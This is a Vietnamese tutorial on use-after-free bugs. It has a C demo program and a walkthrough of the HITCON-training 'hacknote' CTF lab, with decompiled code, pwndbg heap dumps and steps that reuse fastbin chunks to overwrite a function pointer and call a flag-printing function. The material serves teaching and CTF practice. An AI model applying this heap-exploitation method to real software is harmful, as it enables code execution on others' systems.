# Use After Free
## Principle
Có thể hiểu luôn theo nghĩa đen, là khi có 1 vùng nhớ được free và vùng nhớ đó được sử dụng lại. Nhưng mà thường thì sẽ có những trường hợp sau xảy ra:

-	Sau khi 1 memory block được giải phóng, thì con trỏ tương ứng được set `NULL`, sau đó được dùng lại thì chương trình tự nhiên sẽ bị crash.
-	Sau khi 1 memory block được giải phóng, con trỏ tương ứng được set `NULL`, và trước khi nó được dùng vào lần tới, nếu chúng ta không có tác động gì đến vùng nhớ này (ví dụ có 1 đoạn code nào đó để chỉnh sửa chẳng hạn), thì chương trình sẽ hoạt động bình thường.
-	Sau khi 1 memory block được giải phóng, con trỏ tương ứng được set `NULL`, nhưng trước khi nó được dùng, ta có 1 đoạn code nào đó chỉnh sửa vùng nhớ này, thì sau khi chương trình dùng lại vùng nhớ này, nó sẽ có những hành động lạ (output ra các byte lạ,...).

Thông thường thì lỗi này thường thấy ở 2 trường hợp sau. Thêm vào đó, chúng ta thường gọi các con trỏ vào bộ nhớ mà không được set `NULL` sau khi giải phóng nó như 1 con trỏ `treo`?

Ví dụ:
```cpp
#include <stdlib.h>
typedef struct name {
  char *myname;
  void (*func)(char *str);
} NAME;
void myprint(char *str) { printf("%s\n", str); }
void printmyname() { printf("call print my name\n"); }
int main() {
  NAME *a;
  a = (NAME *)malloc(sizeof(struct name));
  a->func = myprint;
  a->myname = "I can also use it";
  a->func("this is my function");
  // free without modify
  free(a);
  a->func("I can also use it");
  // free with modify
  a->func = printmyname;
  a->func("this is my function");
  // set NULL
  a = NULL;
  printf("this pogram will crash...\n");
  a->func("can not be printed...");
}
```
kết quả
```bash
$ ./ex1 
this is my function
I can also use it
call print my name
this pogram will crash...
Segmentation fault (core dumped)
```
## Practice
Ở đây ta sẽ dùng [lab hacknote](https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote) từ HITCON-training.
### Function analysis
Binary gồm các thành phần chính sau:
```c
	puts(" 1. Add note          ");
	puts(" 2. Delete note       ");
	puts(" 3. Print note        ");
	puts(" 4. Exit              ");
```
2 biến global:
```asm
.bss:0804A06C count           dd ?                    ; DATA XREF: add_note+12↑r
.bss:0804A06C                                         ; add_note+15B↑r ...
.bss:0804A070                 public notelist
.bss:0804A070 ; void *notelist
.bss:0804A070 notelist        dd ?                    ; DATA XREF: add_note+40↑r
.bss:0804A070                                         ; add_note+61↑w ...
```

và cuối cùng là cấu trúc note:
```cpp
struct note{
	void *put;
	char *content;
}
```
#### add note
Theo chương trình, chúng ta có thể thấy rằng chương trình có thể thêm tối đa 5 note.  Mỗi note có 2 trường là put và content.  Put sẽ được đặt dưới dạng một hàm và hàm của nó sẽ xuất ra nội dung cụ thể của content.
```cpp
unsigned int add_note()
{
  note *v0; // ebx
  signed int i; // [esp+Ch] [ebp-1Ch]
  int size; // [esp+10h] [ebp-18h]
  char buf; // [esp+14h] [ebp-14h]
  unsigned int v5; // [esp+1Ch] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  if ( count <= 5 )
  {
    for ( i = 0; i <= 4; ++i )
    {
      if ( !notelist[i] )
      {
        notelist[i] = malloc(8u);
        if ( !notelist[i] )
        {
          puts("Alloca Error");
          exit(-1);
        }
        notelist[i]->put = print_note_content;
        printf("Note size :");
        read(0, &buf, 8u);
        size = atoi(&buf);
        v0 = notelist[i];
        v0->content = malloc(size);
        if ( !notelist[i]->content )
        {
          puts("Alloca Error");
          exit(-1);
        }
        printf("Content :");
        read(0, notelist[i]->content, size);
        puts("Success !");
        ++count;
        return __readgsdword(0x14u) ^ v5;
      }
    }
  }
  else
  {
    puts("Full");
  }
  return __readgsdword(0x14u) ^ v5;
}
```
#### print note
print_note đơn giản chỉ là xuất ra nội dung của note tương ứng với index được nhập vào
```cpp
unsigned int print_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
    notelist[v1]->put(notelist[v1]);
  return __readgsdword(0x14u) ^ v3;
}
```
#### delete note
delete_note sẽ giải phóng note tương ứng theo index được chọn.  Tuy nhiên, điều đáng chú ý là khi xóa, nó chỉ đơn giản là `free` và không set thành NULL.  Rõ ràng, đây chính là lỗi UAF.
```cpp
unsigned int del_note()
{
  int v1; // [esp+4h] [ebp-14h]
  char buf; // [esp+8h] [ebp-10h]
  unsigned int v3; // [esp+Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  printf("Index :");
  read(0, &buf, 4u);
  v1 = atoi(&buf);
  if ( v1 < 0 || v1 >= count )
  {
    puts("Out of bound!");
    _exit(0);
  }
  if ( notelist[v1] )
  {
    free(notelist[v1]->content);
    free(notelist[v1]);
    puts("Success");
  }
  return __readgsdword(0x14u) ^ v3;
}
```

### Utilization analysis
Chúng ta có thể thấy rằng đó là lỗi UAF, vậy làm thế nào chúng ta có thể biến nó thành hiện thực và tận dụng nó? Và nên nhớ là chúng ta có một hàm tên là `magic` để cat flag. Liệu chúng ta có thể dùng UAF để execute hàm `magic` không? Một ý tưởng đơn giản và trực tiếp đó là thay đổi trường put của note thành địa chỉ của hàm `magic`, như vậy hàm `magic` sẽ execute mỗi khi hàm `print note` thực thi. Vậy để thực hiện nó như thế nào?

Chúng ta sẽ xem sơ qua cấu trúc của note:

-	Chương trình áp dụng mỗi 8 bytes cho hàm put và content của note.
-	Chương trình chỉ định kích thước của vùng nhớ dựa trên input, sau đó được lưu vào content.

```
   +-----------------+                       
   |   put           |                       
   +-----------------+                       
   |   content       |       size              
   +-----------------+------------------->+----------------+
                                          |     real       |
                                          |    content     |
                                          |                |
                                          +----------------+
```
Vì vậy, dựa trên những gì chúng ta đã học được trong quá trình triển khai heap, rõ ràng lưu ý là một fastbin chunk (kích thước 16 byte).  Mục đích của chúng ta là trường put biến thành địa chỉ của hàm `magic`, như vậy ta cần phải tìm cách sao cho chương trình hiểu trường put của chúng ta là hàm `magic`. Để thực hiện được điều này chúng ta sẽ follow theo những bước sau:

-	Add note 0 (với size là 16).
-	Add note 1 (với size là 16).
-	Delete note 0.
-	Delete note 1.
-	Lúc này list fastbin:	head => 1 => 0 => tail
-	Add note 2 (với size là 8).
-	Thực chất note 2 lúc này được cấp phát bộ nhớ giống như note 0 và 1 (for alignment)
-	Nếu chúng ta viết địa chỉ của `magic` vào content thì lúc này note 0 = NULL vì chúng ta không hề có nó. Khi ta print put content, thì chương trình sẽ gọi hàm `magic`.

Sơ bộ về cấu trúc heap lúc malloc note 0 và 1
```ruby
pwndbg> vis

0x846b000	0x00000000	0x00000011	........
0x846b008	0x0804865b	0x0846b018	[.....F.
0x846b010	0x00000000	0x00000029	....)...
0x846b018	0x61616161	0x0000000a	aaaa....
0x846b020	0x00000000	0x00000000	........
0x846b028	0x00000000	0x00000000	........
0x846b030	0x00000000	0x00000000	........
0x846b038	0x00000000	0x00000011	........
0x846b040	0x0804865b	0x0846b050	[...P.F.
0x846b048	0x00000000	0x00000029	....)...
0x846b050	0x61616464	0x0000000a	ddaa....
0x846b058	0x00000000	0x00000000	........
0x846b060	0x00000000	0x00000000	........
0x846b068	0x00000000	0x00000000	........
0x846b070	0x00000000	0x00020f91	........	 <-- Top chunk
```
Sau khi free note 0 và 1
```ruby
0x846b000	0x00000000	0x00000011	........	 <-- fastbins[0x10][1]
0x846b008	0x00000000	0x0846b018	......F.
0x846b010	0x00000000	0x00000029	....)...	 <-- fastbins[0x28][1]
0x846b018	0x00000000	0x0000000a	........
0x846b020	0x00000000	0x00000000	........
0x846b028	0x00000000	0x00000000	........
0x846b030	0x00000000	0x00000000	........
0x846b038	0x00000000	0x00000011	........	 <-- fastbins[0x10][0]
0x846b040	0x0846b000	0x0846b050	..F.P.F.
0x846b048	0x00000000	0x00000029	....)...	 <-- fastbins[0x28][0]
0x846b050	0x0846b010	0x0000000a	..F.....
0x846b058	0x00000000	0x00000000	........
0x846b060	0x00000000	0x00000000	........
0x846b068	0x00000000	0x00000000	........
0x846b070	0x00000000	0x00020f91	........	 <-- Top chunk
```
fastbins
```ruby
pwndbg> fastbins 
fastbins
0x10: 0x846b038 —▸ 0x846b000 ◂— 0x0
0x18: 0x0
0x20: 0x0
0x28: 0x846b048 —▸ 0x846b010 ◂— 0x0
0x30: 0x0
0x38: 0x0
0x40: 0x0
```

Sau khi add vào note 2
```ruby
pwndbg> vis

0x846b000	0x00000000	0x00000011	........
0x846b008	0x08048986	0x0846b00a	......F.	// địa chỉ magic đã overwrite vào fd
0x846b010	0x00000000	0x00000029	....)...	 <-- fastbins[0x28][1]
0x846b018	0x00000000	0x0000000a	........
0x846b020	0x00000000	0x00000000	........
0x846b028	0x00000000	0x00000000	........
0x846b030	0x00000000	0x00000000	........
0x846b038	0x00000000	0x00000011	........
0x846b040	0x0804865b	0x0846b008	[.....F.
0x846b048	0x00000000	0x00000029	....)...	 <-- fastbins[0x28][0]
0x846b050	0x0846b010	0x0000000a	..F.....
0x846b058	0x00000000	0x00000000	........
0x846b060	0x00000000	0x00000000	........
0x846b068	0x00000000	0x00000000	........
0x846b070	0x00000000	0x00020f91	........	 <-- Top chunk
```
Vì ta đã overwrite được địa chỉ fd của note 0 (đáng lẽ ra vị trí này là của hàm put), nên ta có thể execute được hàm magic
```py
$ python exp.py 
[+] Starting local process './hacknote': pid 43143
[*] running in new terminal: /usr/bin/gdb -q  "./hacknote" 43143
[-] Waiting for debugger: debugger exited! (maybe check /proc/sys/kernel/yama/ptrace_scope)
[*] Switching to interactive mode
flag{use_after_free}----------------------
       HackNote       
----------------------
 1. Add note          
 2. Delete note       
 3. Print note        
 4. Exit              
----------------------
Your choice :$  
```